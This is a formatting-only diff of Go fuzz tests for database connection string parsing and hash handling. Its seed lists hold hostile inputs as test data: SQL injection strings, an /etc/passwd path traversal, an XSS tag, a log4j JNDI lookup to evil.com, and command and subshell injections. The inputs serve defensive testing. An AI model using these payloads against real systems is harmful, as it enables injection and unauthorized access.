@@ -24,37 +24,37 @@ func FuzzDSNParsing(f *testing.F) {
 		"postgres://user:pass@localhost:5432/db?sslmode=disable",
 		"postgres://user@localhost/db",
 		"postgresql://user:pass@host:5432/db?param1=value1&param2=value2",
-		"postgres://user:p@ss:w0rd@localhost/db", // password with special chars
+		"postgres://user:p@ss:w0rd@localhost/db",   // password with special chars
 		"postgres://user%20name:pass@localhost/db", // URL encoded username
 		"postgres://user:pass@192.168.1.1:5432/db",
 		"postgres://user:pass@[::1]:5432/db", // IPv6
 		"postgres://user:pass@host/db?connect_timeout=10",
 		"", // empty DSN
 		"not-a-dsn",
-		"postgres://", // incomplete
-		"postgres://user:pass@/db", // missing host
-		"postgres://user:pass@:5432/db", // missing host with port
-		"postgres://:pass@localhost/db", // missing user
-		"postgres://user:@localhost/db", // missing password
+		"postgres://",                     // incomplete
+		"postgres://user:pass@/db",        // missing host
+		"postgres://user:pass@:5432/db",   // missing host with port
+		"postgres://:pass@localhost/db",   // missing user
+		"postgres://user:@localhost/db",   // missing password
 		"postgres://user:pass@localhost/", // missing database
-		"postgres://user:pass@localhost:notaport/db", // invalid port
-		"postgres://user:pass@localhost:99999/db", // port out of range
-		"postgres://user:pass@host with spaces/db", // spaces in host
-		"postgres://user:pass@host/db with spaces", // spaces in db name
-		"postgres://user:pass@host/db?invalid param=value", // invalid param
-		"postgres://user:pass@host/db?param=value with spaces", // spaces in param value
-		"postgres://user:pass@host/../../etc/passwd", // path traversal attempt
-		"postgres://user:pass@host/db;DROP TABLE users;--", // SQL injection attempt
-		"postgres://user:pass@host/db%00", // null byte
-		"postgres://user:pass@host/db\x00", // null byte variant
-		"postgres://user:pass@host/db%20OR%201=1", // SQL injection encoded
-		"postgres://user:pass@host/db?sslmode=disable;DROP TABLE", // injection in params
-		strings.Repeat("a", 1000), // long string
-		strings.Repeat("postgres://user:pass@host/db?", 100), // many params
+		"postgres://user:pass@localhost:notaport/db",               // invalid port
+		"postgres://user:pass@localhost:99999/db",                  // port out of range
+		"postgres://user:pass@host with spaces/db",                 // spaces in host
+		"postgres://user:pass@host/db with spaces",                 // spaces in db name
+		"postgres://user:pass@host/db?invalid param=value",         // invalid param
+		"postgres://user:pass@host/db?param=value with spaces",     // spaces in param value
+		"postgres://user:pass@host/../../etc/passwd",               // path traversal attempt
+		"postgres://user:pass@host/db;DROP TABLE users;--",         // SQL injection attempt
+		"postgres://user:pass@host/db%00",                          // null byte
+		"postgres://user:pass@host/db\x00",                         // null byte variant
+		"postgres://user:pass@host/db%20OR%201=1",                  // SQL injection encoded
+		"postgres://user:pass@host/db?sslmode=disable;DROP TABLE",  // injection in params
+		strings.Repeat("a", 1000),                                  // long string
+		strings.Repeat("postgres://user:pass@host/db?", 100),       // many params
 		"postgres://" + strings.Repeat("a", 255) + ":pass@host/db", // long username
 		"postgres://user:" + strings.Repeat("b", 255) + "@host/db", // long password
 		"postgres://user:pass@" + strings.Repeat("c", 255) + "/db", // long host
-		"postgres://user:pass@host/" + strings.Repeat("d", 255), // long database
+		"postgres://user:pass@host/" + strings.Repeat("d", 255),    // long database
 	}
 
 	for _, seed := range seeds {
@@ -80,14 +80,14 @@ func FuzzDSNParsing(f *testing.F) {
 		// Check for potential security issues in error messages
 		if err != nil {
 			errStr := err.Error()
-			
+
 			// Error messages should not reflect raw user input to prevent information leakage
 			// Note: pgx driver may include database name in error, which is acceptable
 			// We're mainly concerned about command execution indicators
 			if strings.Contains(dsn, "DROP TABLE") && strings.Contains(errStr, "DROP TABLE") {
 				t.Logf("Warning: Error message reflects potential SQL injection: %v", err)
 			}
-			
+
 			// Path traversal in database names is handled safely by pgx
 			if strings.Contains(dsn, "../") && strings.Contains(errStr, "../") {
 				t.Logf("Note: Path traversal attempt in DSN was safely handled: %v", err)
@@ -104,11 +104,11 @@ func FuzzHashOperations(f *testing.F) {
 		"a",
 		"abc123",
 		"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // SHA256 of empty string
-		strings.Repeat("a", 64), // typical hash length
-		strings.Repeat("b", 128), // double hash length
+		strings.Repeat("a", 64),         // typical hash length
+		strings.Repeat("b", 128),        // double hash length
 		"'; DROP TABLE sent_alerts; --", // SQL injection
-		"' OR '1'='1", // SQL injection
-		"\x00", // null byte
+		"' OR '1'='1",                   // SQL injection
+		"\x00",                          // null byte
 		"hash\x00with\x00nulls",
 		"hash\nwith\nnewlines",
 		"hash\twith\ttabs",
@@ -122,14 +122,14 @@ func FuzzHashOperations(f *testing.F) {
 		"hash'with'quotes",
 		`hash"with"doublequotes`,
 		"hash`with`backticks",
-		strings.Repeat("x", 1000), // long hash
-		"🔒🔑🎯", // unicode
-		"\u0000\u0001\u0002", // control characters
+		strings.Repeat("x", 1000),       // long hash
+		"🔒🔑🎯",                           // unicode
+		"\u0000\u0001\u0002",            // control characters
 		"<script>alert('xss')</script>", // XSS attempt
-		"${jndi:ldap://evil.com/a}", // log4j style injection
-		"{{7*7}}", // template injection
-		"$(echo pwned)", // command injection
-		"`echo pwned`", // command injection variant
+		"${jndi:ldap://evil.com/a}",     // log4j style injection
+		"{{7*7}}",                       // template injection
+		"$(echo pwned)",                 // command injection
+		"`echo pwned`",                  // command injection variant
 		"hash%20with%20encoding",
 		"hash+with+plus",
 		"hash%00with%00null",
@@ -318,10 +318,10 @@ func FuzzEnvironmentDSN(f *testing.F) {
 		"postgres://localhost",
 		"postgres://user:pass@host/db",
 		"postgres://user:p@$$w0rd!@host/db", // special chars in password
-		"postgres://${USER}:${PASS}@${HOST}/${DB}", // unexpanded vars
-		"postgres://user:pass@host/db; echo pwned", // command injection
-		"postgres://user:pass@host/db\necho pwned", // newline injection
-		"postgres://user:pass@host/db`echo pwned`", // backtick injection
+		"postgres://${USER}:${PASS}@${HOST}/${DB}",  // unexpanded vars
+		"postgres://user:pass@host/db; echo pwned",  // command injection
+		"postgres://user:pass@host/db\necho pwned",  // newline injection
+		"postgres://user:pass@host/db`echo pwned`",  // backtick injection
 		"postgres://user:pass@host/db$(echo pwned)", // subshell injection
 	}
 
